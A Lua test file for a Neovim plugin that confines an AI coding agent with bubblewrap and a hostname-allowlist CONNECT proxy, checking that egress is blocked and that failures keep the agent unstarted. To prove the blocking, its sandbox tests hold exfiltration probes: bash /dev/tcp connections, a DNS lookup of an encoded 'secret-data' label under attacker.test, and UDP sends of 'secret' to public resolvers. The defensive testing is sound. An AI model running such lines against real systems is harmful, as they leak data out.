-- Network egress: default-deny with a hostname allowlist (issue #3).
-- Pure part: allowlist parsing and matching, the address check. Proxy part: the CONNECT filter on
-- a unix socket, no bwrap. Sandbox part: real commands inside bwrap against a fake $HOME, a stub
-- resolver (so no internet is needed) and listeners on the HOST's loopback. Fail-closed part:
-- every way the filter can fail leaves the agent unstarted.
local H = require("xynotest.helpers")
if H.os ~= "linux" then
  H.skip_file("needs linux")
end
local harness = require("xynotest.harness")
local net = require("xyno_sandbox.net")
local store = require("xyno_sandbox.store")
local plan_mod = require("xyno_sandbox.plan")
local real_mod = require("xyno_sandbox")
local MOD = "xyno_sandbox"
local uv = vim.uv

-- ------------------------------------------------------------------ helpers

local function fake_home()
  local base = uv.os_homedir() .. "/.cache"
  vim.fn.mkdir(base, "p")
  local dir = assert(uv.fs_mkdtemp(base .. "/xyno-sandbox-spec-XXXXXX"))
  H._dirs[#H._dirs + 1] = dir
  dir = uv.fs_realpath(dir)
  vim.fn.mkdir(dir .. "/.claude", "p")
  return dir
end

local function load_for(home)
  local old = uv.os_getenv("HOME")
  uv.os_setenv("HOME", home)
  package.loaded[MOD] = nil
  local m = require(MOD)
  uv.os_setenv("HOME", old)
  package.loaded[MOD] = real_mod
  return m
end

local lookups
local function stub_resolver(map)
  lookups = {}
  net.resolver = function(host, cb)
    lookups[#lookups + 1] = host
    -- called straight back: vim.system():wait() does not run vim.schedule callbacks
    if map[host] then
      cb(map[host])
    else
      cb(nil, "NXDOMAIN")
    end
  end
end

local real_notify = vim.notify
before_each(function()
  vim.notify = function() end -- the "blocked network access" warnings are expected noise here
end)
after_each(function()
  vim.notify = real_notify
end)

local servers = {}
local function listen(host, handler)
  local srv = uv.new_tcp()
  assert(srv:bind(host, 0))
  srv:listen(8, function()
    local c = uv.new_tcp()
    srv:accept(c)
    c:read_start(function(err, chunk)
      if err or not chunk then
        return c:close()
      end
      if handler then
        handler(c, chunk)
      end
    end)
  end)
  servers[#servers + 1] = srv
  return srv:getsockname().port
end

--- A host-side echo server: answers "pong:" .. data.
local function echo_server()
  return listen("127.0.0.1", function(c, chunk)
    c:write("pong:" .. chunk)
  end)
end

local function wait_for(pred, ms)
  return vim.wait(ms or 5000, pred, 10)
end

--- Talk to the proxy socket: send `data`, collect the reply until `done(reply)` or EOF.
local function ask(sock, data, done)
  local pipe = uv.new_pipe(false)
  local reply, finished = "", false
  pipe:connect(sock, function(err)
    assert(not err, err)
    pipe:read_start(function(_, chunk)
      if chunk then
        reply = reply .. chunk
      end
      if not chunk or (done and done(reply)) then
        finished = true
      end
    end)
    pipe:write(data)
  end)
  wait_for(function()
    return finished
  end)
  pipe:close()
  return reply
end

local function start_proxy(hosts, opts)
  local dir = H.tmpdir()
  local p, err = net.start(vim.tbl_extend("force", { sock = dir .. "/p.sock", hosts = hosts }, opts or {}))
  assert(p, err)
  return p
end

after_each(function()
  net.resolver, net.allow_private = nil, false
  for _, s in ipairs(servers) do
    if not s:is_closing() then
      s:close()
    end
  end
  servers = {}
  store.dir_override = nil
  package.loaded[MOD] = real_mod
  real_mod.config.network, real_mod.config.allow_hosts = "filtered", nil
end)

local function connect_line(host, port)
  return ("CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n"):format(host, port, host, port)
end

-- ------------------------------------------------------------------- pure

describe("allowlist entries", function()
  it("parses host, host:port and *.suffix, lowercased", function()
    H.eq({ host = "crates.io", port = 443, wildcard = false, text = "crates.io" }, net.parse_entry("Crates.IO"))
    H.eq(8443, net.parse_entry("a.example.com:8443").port)
    local w = net.parse_entry("*.github.io")
    H.eq({ true, "github.io" }, { w.wildcard, w.host })
  end)

  it("refuses IP literals, single labels, bad wildcards, IPv6 and odd ports", function()
    for _, bad in ipairs({ "1.2.3.4", "127.0.0.1:80", "localhost", "0x7f.1", "2130706433", "*.com", "*", "[::1]:443",
      "a b.com", "a..com", "-a.com", "example.com:0", "example.com:70000", "", "::1" }) do
      H.not_ok(net.parse_entry(bad), bad)
    end
  end)

  it("matches exact names and ports; a wildcard covers subdomains but not the apex", function()
    local l = net.parse_list({ "crates.io", "*.example.com", "api.x.org:8443" })
    H.ok(net.match(l, "crates.io", 443))
    H.not_ok(net.match(l, "crates.io", 80), "port")
    H.not_ok(net.match(l, "evilcrates.io", 443), "no suffix match without a wildcard")
    H.not_ok(net.match(l, "sub.crates.io", 443), "no implicit subdomains")
    H.ok(net.match(l, "a.b.example.com", 443))
    H.not_ok(net.match(l, "example.com", 443), "apex")
    H.not_ok(net.match(l, "notexample.com", 443))
    H.ok(net.match(l, "api.x.org", 8443))
  end)

  it("the default list is short and has the agent API and the crate registries, not github", function()
    local d = real_mod.default_hosts
    H.has(d, "api.anthropic.com")
    H.has(d, "crates.io")
    H.has(d, "static.crates.io")
    H.has(d, "index.crates.io")
    H.not_ok(vim.tbl_contains(d, "github.com"))
    H.ok(#d <= 6)
  end)
end)

describe("address check", function()
  it("refuses loopback, private, link-local, metadata, multicast and mapped forms", function()
    for _, ip in ipairs({ "127.0.0.1", "10.1.2.3", "172.16.0.1", "192.168.1.1", "169.254.169.254", "100.64.0.1", "0.0.0.0",
      "224.0.0.1", "::1", "::", "fe80::1", "fc00::1", "fd12::1", "ff02::1", "::ffff:127.0.0.1", "::ffff:7f00:1",
      "::ffff:a9fe:a9fe", "64:ff9b::7f00:1", "2001:db8::1", "not-an-ip" }) do
      H.not_ok(net.is_public_ip(ip), ip)
    end
  end)

  it("lets global unicast addresses through", function()
    for _, ip in ipairs({ "93.184.216.34", "1.1.1.1", "2606:4700:4700::1111", "::ffff:5db8:d822" }) do
      H.ok(net.is_public_ip(ip), ip)
    end
  end)
end)

-- ------------------------------------------------------------------ proxy

describe("the filtering proxy", function()
  it("tunnels an allowed host (resolved by the proxy, not by the client)", function()
    local port = echo_server()
    stub_resolver({ ["allowed.test"] = { "127.0.0.1" } })
    net.allow_private = true
    local p = start_proxy({ "allowed.test:" .. port })
    local r = ask(p.sock, connect_line("allowed.test", port) .. "ping", function(s)
      return s:find("pong:ping", 1, true)
    end)
    p.close()
    H.match(r, "HTTP/1.1 200", true)
    H.match(r, "pong:ping", true)
    H.eq({ "allowed.test" }, lookups)
    H.ok(p.decisions[1].allowed)
  end)

  it("blocks a host that is not on the list, with 403, and never resolves it", function()
    stub_resolver({ ["evil.test"] = { "93.184.216.34" } })
    local p = start_proxy({ "allowed.test" })
    local r = ask(p.sock, connect_line("evil.test", 443))
    p.close()
    H.match(r, "HTTP/1.1 403", true)
    H.match(r, "not on the network allowlist", true)
    H.eq({}, lookups)
    H.eq(false, p.decisions[1].allowed)
  end)

  it("blocks the allowed name on another port", function()
    stub_resolver({ ["allowed.test"] = { "93.184.216.34" } })
    local p = start_proxy({ "allowed.test" })
    local r = ask(p.sock, connect_line("allowed.test", 22))
    p.close()
    H.match(r, "HTTP/1.1 403", true)
    H.eq({}, lookups)
  end)

  it("blocks raw IPs, also ones that look like allowed ports and forms like 0x7f.1", function()
    stub_resolver({})
    local p = start_proxy({ "allowed.test" })
    for _, t in ipairs({ "93.184.216.34:443", "127.0.0.1:443", "[::1]:443", "0x7f.1:443", "2130706433:443", "localhost:443" }) do
      local r = ask(p.sock, ("CONNECT %s HTTP/1.1\r\n\r\n"):format(t))
      H.match(r, "HTTP/1.1 403", true, t)
    end
    p.close()
    H.eq({}, lookups, "no DNS lookup for anything that is not an allowed name")
  end)

  it("blocks an allowed name that resolves to a private or loopback address (rebinding to local services)", function()
    stub_resolver({ ["allowed.test"] = { "127.0.0.1", "169.254.169.254", "10.0.0.5" } })
    local p = start_proxy({ "allowed.test" })
    local r = ask(p.sock, connect_line("allowed.test", 443))
    p.close()
    H.match(r, "HTTP/1.1 502", true)
    H.match(r, "non-public", true)
  end)

  it("answers a name that does not resolve with 502", function()
    stub_resolver({})
    local p = start_proxy({ "allowed.test" })
    local r = ask(p.sock, connect_line("allowed.test", 443))
    p.close()
    H.match(r, "HTTP/1.1 502", true)
  end)

  it("does not proxy plain HTTP or other methods", function()
    stub_resolver({ ["allowed.test"] = { "93.184.216.34" } })
    local p = start_proxy({ "allowed.test" })
    local r = ask(p.sock, "GET http://allowed.test/ HTTP/1.1\r\nHost: allowed.test\r\n\r\n")
    p.close()
    H.match(r, "HTTP/1.1 405", true)
    H.eq({}, lookups)
  end)

  it("rejects an oversized header and garbage", function()
    local p = start_proxy({ "allowed.test" })
    H.match(ask(p.sock, string.rep("A", 9000)), "431", true)
    H.match(ask(p.sock, "\0\0\0\r\n\r\n"), "405", true)
    p.close()
  end)

  it("the socket is 0600 and goes away on close", function()
    local p = start_proxy({ "allowed.test" })
    local st = uv.fs_stat(p.sock)
    H.eq("600", ("%o"):format(bit.band(st.mode, tonumber("777", 8))))
    p.close()
    H.not_ok(uv.fs_stat(p.sock))
  end)
end)

-- --------------------------------------------------------------- the plan

describe("the plan and the preview", function()
  local function plan_for(m, project, tmp)
    return m.plan({ "agent" }, project, tmp, { aux = { empty = "/aux/empty", claude_json = "/aux/cj", net_dir = "/aux/net" } })
  end
  local function need()
    if real_mod.status_blocking().mode ~= "bwrap" then
      harness.skip("needs a working bwrap to build a bwrap plan")
    end
  end

  it("is filtered by default: --unshare-net, the socket dir read-only, proxy variables, the default hosts", function()
    need()
    local m = load_for(fake_home())
    local p = plan_for(m, H.tmpdir(), H.tmpdir())
    H.eq("filtered", p.network)
    local a = m.argv(p)
    H.has(a, "--unshare-net")
    local i
    for k = 1, #a - 2 do
      if a[k] == "--ro-bind" and a[k + 1] == "/aux/net" and a[k + 2] == "/aux/net" then
        i = k
      end
    end
    H.ok(i, "socket dir bound read-only")
    for _, n in ipairs({ "HTTPS_PROXY", "https_proxy", "HTTP_PROXY", "ALL_PROXY" }) do
      local found
      for k = 1, #a - 2 do
        found = found or (a[k] == "--setenv" and a[k + 1] == n and a[k + 2] == "http://127.0.0.1:3128")
      end
      H.ok(found, n)
    end
    local names = vim.tbl_map(function(h) return h.host end, p.net.hosts)
    H.eq(m.default_hosts, names)
  end)

  it("network = 'open' has no --unshare-net, no proxy variables and no net section; anything but 'open' is filtered", function()
    need()
    local m = load_for(fake_home())
    m.config.network = "open"
    local p = plan_for(m, H.tmpdir(), H.tmpdir())
    H.eq("open", p.network)
    H.eq(nil, p.net)
    local a = m.argv(p)
    H.not_ok(vim.tbl_contains(a, "--unshare-net"))
    H.not_ok(vim.tbl_contains(a, "HTTPS_PROXY"))
    for _, v in ipairs({ "OPEN", "opne", "none", true, false, 0 }) do
      m.config.network = v
      H.eq("filtered", plan_for(m, H.tmpdir(), H.tmpdir()).network, vim.inspect(v))
    end
  end)

  it("allow_hosts replaces the default list; setup validates network and the entries", function()
    need()
    local m = load_for(fake_home())
    m.config.allow_hosts = { "github.com", "*.example.org:8443" }
    local p = plan_for(m, H.tmpdir(), H.tmpdir())
    H.eq({ "github.com", "*.example.org:8443" }, vim.tbl_map(function(h) return h.host end, p.net.hosts))
    H.eq("allow_hosts", p.net.hosts[1].why)
    H.eq({}, m.validate_opts({ network = "open", allow_hosts = { "github.com" } }))
    H.ok(#m.validate_opts({ network = "off" }) > 0)
    H.ok(#m.validate_opts({ allow_hosts = { "1.2.3.4" } }) > 0)
    H.ok(#m.validate_opts({ allow_hosts = { "*.com" } }) > 0)
    H.throws(function() m.setup({ network = true }) end, "network")
  end)

  it("the preview lists the allowlist and says OPEN for an open network", function()
    need()
    local m = load_for(fake_home())
    local ui = require("xyno_sandbox.ui")
    local text = table.concat(ui.lines(plan_for(m, H.tmpdir(), H.tmpdir())), "\n")
    H.match(text, "network   FILTERED", true)
    H.match(text, "Network allowlist (all other hosts, raw IPs and DNS are blocked) (5)", true)
    H.match(text, "api.anthropic.com  [default]", true)
    H.match(text, "index.crates.io  [default]", true)
    m.config.network = "open"
    text = table.concat(ui.lines(plan_for(m, H.tmpdir(), H.tmpdir())), "\n")
    H.match(text, "network   OPEN", true)
    H.no_match(text, "Network allowlist", true)
  end)

  it("a host approval is logged like a path exception, joins the allowlist and can be refused or invalid", function()
    need()
    store.dir_override = H.tmpdir() .. "/state"
    local project, tmp = H.tmpdir(), H.tmpdir()
    local e = real_mod.approve(project, "host", "GitHub.com", "once")
    H.eq({ kind = "host", value = "github.com", scope = "once" }, e)
    local log = store.read_log()
    H.eq({ "host", "approved", "github.com" }, { log[1].kind, log[1].decision, log[1].host })
    local p = real_mod.plan({ "agent" }, project, tmp, { exceptions = { e }, aux = { empty = "/e", claude_json = "/c", net_dir = "/n" } })
    local last = p.net.hosts[#p.net.hosts]
    H.eq({ "github.com", "approved exception" }, { last.host, last.why })
    H.match(table.concat(require("xyno_sandbox.ui").lines(p), "\n"), "host github.com  [once]", true)
    -- invalid: an IP is refused and logged
    local bad, why = real_mod.approve(project, "host", "1.2.3.4", "project")
    H.eq(nil, bad)
    H.match(why, "not an allowlist host", true)
    H.eq("refused", store.read_log()[2].decision)
    H.eq({}, real_mod.approvals(project))
    -- refused: plan unchanged
    real_mod.refuse(project, "host", "evil.example")
    local p2 = real_mod.plan({ "agent" }, project, tmp, { aux = { empty = "/e", claude_json = "/c", net_dir = "/n" } })
    H.eq(#p.net.hosts - 1, #p2.net.hosts)
    -- remembered: listed and revocable
    real_mod.approve(project, "host", "docs.rs", "project")
    H.eq("docs.rs", real_mod.approvals(project)[1].value)
    local p3 = real_mod.plan({ "agent" }, project, tmp, { aux = { empty = "/e", claude_json = "/c", net_dir = "/n" } })
    H.eq("docs.rs", p3.net.hosts[#p3.net.hosts].host)
  end)

  it("a host exception on an open network is ignored with a reason", function()
    local p = plan_mod.build({
      project = "/h/proj", tmp_dir = "/h/t", home = "/h", cmd = { "a" }, config = { network = "open" },
      exceptions = { { kind = "host", value = "github.com", scope = "once" } },
      probes = { stat_type = function() end, exists = function() return false end, list = function() return {} end,
        glob = function() return {} end, read_line = function() end, realpath = function(x) return x end },
    })
    H.eq(0, #p.exceptions)
    H.match(p.rejected[1].reason, "open", true)
  end)
end)

-- ---------------------------------------------------------- in the sandbox

describe("inside the sandbox", function()
  local function run_in(m, home, script, project, hosts)
    H.need_sandbox()
    m.config.allow_hosts = hosts
    local tmp = H.tmpdir()
    local prev = vim.fn.chdir(project)
    local cmd, err, h = m.wrap({ "bash", "-c", script }, project, tmp)
    vim.fn.chdir(prev)
    assert(cmd, err)
    local r = vim.system(cmd, { cwd = project, text = true, env = { HOME = home } }):wait(60000)
    return r, h
  end

  -- one HTTP CONNECT through the in-sandbox relay; prints status and, for a tunnel, the echo
  local function via_proxy(target, send)
    return table.concat({
      "exec 3<>/dev/tcp/127.0.0.1/3128 || { echo relay=unreachable; exit 0; }",
      ("printf 'CONNECT %s HTTP/1.1\\r\\n\\r\\n' >&3"):format(target),
      "read -r -t 5 status <&3; echo \"status=${status%$'\\r'}\"",
      send and "read -r -t 5 _ <&3; printf 'ping\\n' >&3; read -r -t 5 reply <&3; echo \"reply=$reply\"" or "true",
    }, "\n")
  end

  it("an allowed host is reachable through the proxy (HTTPS_PROXY points at the relay)", function()
    local port = echo_server()
    stub_resolver({ ["allowed.test"] = { "127.0.0.1" } })
    net.allow_private = true
    local home = fake_home()
    local m = load_for(home)
    local r, h = run_in(m, home, 'echo "proxy=$HTTPS_PROXY"\n' .. via_proxy("allowed.test:" .. port, true), H.tmpdir(),
      { "allowed.test:" .. port })
    h.release()
    H.eq(0, r.code, r.stdout .. r.stderr)
    H.match(r.stdout, "proxy=http://127.0.0.1:3128", true)
    H.match(r.stdout, "status=HTTP/1.1 200", true)
    H.match(r.stdout, "reply=pong:ping", true)
    H.eq({ "allowed.test" }, lookups)
  end)

  it("a host that is not on the list is blocked with 403 and is logged once; the proxy never resolves it", function()
    stub_resolver({ ["evil.test"] = { "93.184.216.34" } })
    store.dir_override = H.tmpdir() .. "/state"
    local home = fake_home()
    local m = load_for(home)
    local seen = {}
    local orig = vim.notify
    -- (only this plugin's own messages count: Neovim itself may announce on its first loop turn that it cannot
    -- write its log file, e.g. when the caller's $HOME does not exist)
    vim.notify = function(msg)
      if tostring(msg):find("^xyno%-sandbox:") then
        seen[#seen + 1] = msg
      end
    end
    local r, h = run_in(m, home, via_proxy("evil.test:443") .. "\n" .. via_proxy("evil.test:443"), H.tmpdir(), { "allowed.test" })
    wait_for(function() return #store.read_log() > 0 end)
    vim.notify = orig
    local blocked = h.blocked()
    h.release()
    H.match(r.stdout, "status=HTTP/1.1 403", true)
    H.eq({}, lookups)
    H.eq(2, #blocked)
    local log = store.read_log()
    H.eq(1, #log, "one log entry per blocked host and launch")
    H.eq({ "host", "blocked", "evil.test:443" }, { log[1].kind, log[1].decision, log[1].host })
    H.eq(1, #seen)
    H.match(seen[1], "blocked network access to evil.test:443", true)
  end)

  it("raw IPs are blocked: no route out of the sandbox, host loopback listeners are unreachable, the proxy refuses IP targets", function()
    local port = echo_server() -- on the HOST's 127.0.0.1
    stub_resolver({})
    local home = fake_home()
    local m = load_for(home)
    local script = table.concat({
      "(exec 3<>/dev/tcp/1.1.1.1/443) 2>/dev/null && echo direct_ip=REACHED || echo direct_ip=blocked",
      "(exec 3<>/dev/tcp/93.184.216.34/443) 2>/dev/null && echo direct_ip2=REACHED || echo direct_ip2=blocked",
      "(exec 3<>/dev/tcp/127.0.0.1/" .. port .. ") 2>/dev/null && echo host_loopback=REACHED || echo host_loopback=blocked",
      "(exec 3<>/dev/tcp/::1/" .. port .. ") 2>/dev/null && echo host_loopback6=REACHED || echo host_loopback6=blocked",
      via_proxy("93.184.216.34:443"),
      via_proxy("127.0.0.1:" .. port),
    }, "\n")
    local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
    h.release()
    H.match(r.stdout, "direct_ip=blocked", true)
    H.match(r.stdout, "direct_ip2=blocked", true)
    H.match(r.stdout, "host_loopback=blocked", true)
    H.match(r.stdout, "host_loopback6=blocked", true)
    H.no_match(r.stdout, "REACHED", true)
    local n = select(2, r.stdout:gsub("status=HTTP/1.1 403", ""))
    H.eq(2, n)
    H.eq({}, lookups)
  end)

  it("DNS exfiltration fails: no resolver is reachable, UDP never leaves, and the proxy resolves only allowed names", function()
    stub_resolver({})
    local got = {}
    local udp = uv.new_udp()
    assert(udp:bind("127.0.0.1", 0))
    udp:recv_start(function(_, data) got[#got + 1] = data end)
    local uport = udp:getsockname().port
    local home = fake_home()
    local m = load_for(home)
    local script = table.concat({
      "getent hosts c2VjcmV0LWRhdGE.attacker.test >/dev/null 2>&1 && echo dns=RESOLVED || echo dns=failed",
      "getent hosts one.one.one.one >/dev/null 2>&1 && echo dns2=RESOLVED || echo dns2=failed",
      "(echo secret > /dev/udp/127.0.0.1/" .. uport .. ") 2>/dev/null; echo udp_loopback=sent",
      "(echo secret > /dev/udp/8.8.8.8/53) 2>/dev/null && echo udp_ext=SENT || echo udp_ext=blocked",
      "(echo secret > /dev/udp/1.1.1.1/53) 2>/dev/null && echo udp_ext2=SENT || echo udp_ext2=blocked",
      via_proxy("c2VjcmV0LWRhdGE.attacker.test:443"),
    }, "\n")
    local r, h = run_in(m, home, script, H.tmpdir(), { "allowed.test" })
    h.release()
    vim.wait(300, function() return #got > 0 end)
    udp:close()
    H.match(r.stdout, "dns=failed", true)
    H.match(r.stdout, "dns2=failed", true)
    H.match(r.stdout, "udp_ext=blocked", true)
    H.match(r.stdout, "udp_ext2=blocked", true)
    H.eq({}, got, "nothing reached the host's loopback over UDP")
    H.match(r.stdout, "status=HTTP/1.1 403", true)
    H.eq({}, lookups, "the exfil name was never looked up on the host")
  end)

  it("in network = 'open' mode the sandbox shares the host network and no proxy runs", function()
    local port = echo_server()
    local home = fake_home()
    local m = load_for(home)
    m.config.network = "open"
    H.need_sandbox()
    local tmp = H.tmpdir()
    local project = H.tmpdir()
    local prev = vim.fn.chdir(project)
    local cmd, _, h = m.wrap({ "bash", "-c", "(exec 3<>/dev/tcp/127.0.0.1/" .. port .. ") 2>/dev/null && echo open=reached; echo p=[$HTTPS_PROXY]" }, project, tmp)
    vim.fn.chdir(prev)
    H.eq(nil, h.proxy)
    local r = vim.system(cmd, { cwd = project, text = true, env = { HOME = home, HTTPS_PROXY = "" } }):wait(60000)
    h.release()
    H.match(r.stdout, "open=reached", true)
  end)

  it("release stops the proxy and removes the socket directory", function()
    local home = fake_home()
    local m = load_for(home)
    local r, h = run_in(m, home, "true", H.tmpdir(), { "allowed.test" })
    H.eq(0, r.code, r.stderr)
    local dir = h.net_dir
    H.ok(uv.fs_stat(dir .. "/relay.lua"))
    h.release()
    H.not_ok(uv.fs_stat(dir))
    H.not_ok(uv.fs_stat(h.plan.net.sock))
  end)
end)

-- ------------------------------------------------------------ fail closed

describe("fail closed", function()
  local function wrap_fresh()
    local home = fake_home()
    local m = load_for(home)
    local project = H.tmpdir()
    local prev = vim.fn.chdir(project)
    local a, err, h = m.wrap({ "echo", "started" }, project, H.tmpdir())
    vim.fn.chdir(prev)
    return m, a, err, h
  end

  it("a proxy that cannot start means the agent does not start", function()
    H.need_sandbox()
    local orig = net.start
    net.start = function() return nil, "boom" end
    local ok, m, a, err = pcall(wrap_fresh)
    net.start = orig
    assert(ok, m)
    H.eq(nil, a)
    H.match(err, "network egress cannot be enforced", true)
    H.match(err, "boom", true)
    H.match(err, 'network = "open"', true)
    H.eq(0, m.running())
  end)

  it("a proxy that raises means the agent does not start", function()
    H.need_sandbox()
    local orig = net.start
    net.start = function() error("kaput") end
    local ok, m, a, err = pcall(wrap_fresh)
    net.start = orig
    assert(ok, m)
    H.eq(nil, a)
    H.match(err, "kaput", true)
  end)

  it("a socket that cannot be bound (path too long) means the agent does not start, and leaves nothing behind", function()
    H.need_sandbox()
    local home = fake_home()
    local m = load_for(home)
    local project = H.tmpdir()
    local long = H.tmpdir() .. "/" .. string.rep("d", 120)
    local aux = H.tmpdir()
    local plan = m.plan({ "echo" }, project, H.tmpdir(), { aux = { empty = aux .. "/e", claude_json = aux .. "/c", net_dir = long } })
    local a, err = m.wrap({ "echo" }, project, H.tmpdir(), { plan = plan })
    H.eq(nil, a)
    H.match(err, "network egress cannot be enforced", true)
    H.not_ok(uv.fs_stat(long))
  end)

  it("a missing nvim for the relay means the agent does not start", function()
    H.need_sandbox()
    local home = fake_home()
    local m = load_for(home)
    local project = H.tmpdir()
    local plan = m.plan({ "echo" }, project, H.tmpdir())
    plan.net.nvim = "/nonexistent/nvim"
    local a, err = m.wrap({ "echo" }, project, H.tmpdir(), { plan = plan })
    H.eq(nil, a)
    H.match(err, "relay needs it", true)
    H.eq(0, m.running())
  end)

  it("a relay that does not come up inside the sandbox stops the launcher with 125 before the agent runs", function()
    H.need_sandbox()
    local home = fake_home()
    local m = load_for(home)
    local project = H.tmpdir()
    local marker = project .. "/agent-ran"
    local prev = vim.fn.chdir(project)
    local cmd, err, h = m.wrap({ "touch", marker }, project, H.tmpdir())
    vim.fn.chdir(prev)
    assert(cmd, err)
    local f = assert(io.open(h.net_dir .. "/relay.lua", "w"))
    f:write("os.exit(3)\n")
    f:close()
    local r = vim.system(cmd, { cwd = project, text = true, env = { HOME = home } }):wait(60000)
    h.release()
    H.eq(125, r.code, r.stderr)
    H.match(r.stderr, "network relay did not start", true)
    H.not_ok(uv.fs_stat(marker), "the agent must not have run")
  end)

  it("a bwrap without a usable network namespace is a failed readiness probe: refused, with the reason", function()
    local probe = require("xyno_sandbox.probe")
    probe.net = true
    local reason, hint = probe.diagnose({ code = 1, stderr = "bwrap: loopback: Failed RTM_NEWADDR: Operation not permitted" },
      function() return nil end)
    probe.net = false
    H.match(reason, "isolated network namespace", true)
    H.match(hint, "not started", true)
    H.match(hint, 'network = "open"', true)
    H.match(table.concat(plan_mod.probe_argv(true), " "), "--unshare-net", true)
    H.not_ok(table.concat(plan_mod.probe_argv(false), " "):find("--unshare-net", 1, true))
  end)

  it("the readiness probe of a filtered setup runs with --unshare-net and is cached apart from an open one", function()
    H.need_sandbox()
    local probe = require("xyno_sandbox.probe")
    probe.reset()
    probe.net = true
    local a = probe.run_sync()
    probe.net = false
    H.ok(a.ok)
    H.eq(nil, probe.cached(), "the open-network verdict is not the filtered one")
    probe.net = true
    H.ok(probe.cached())
    probe.net = false
  end)
end)

describe("docs", function()
  it("README and help state the filtered default, the OPEN opt-out and the limits that remain", function()
    local text = H.docs_text()
    for _, s in ipairs({ "network = \"open\"", "allow_hosts", "--unshare-net", "CONNECT", "no DNS", "raw IP",
      "allowed host", "TLS", "SNI" }) do
      H.match(text, s, true)
    end
    H.no_match(text, "the network is open: the preview shows it", true)
  end)
end)
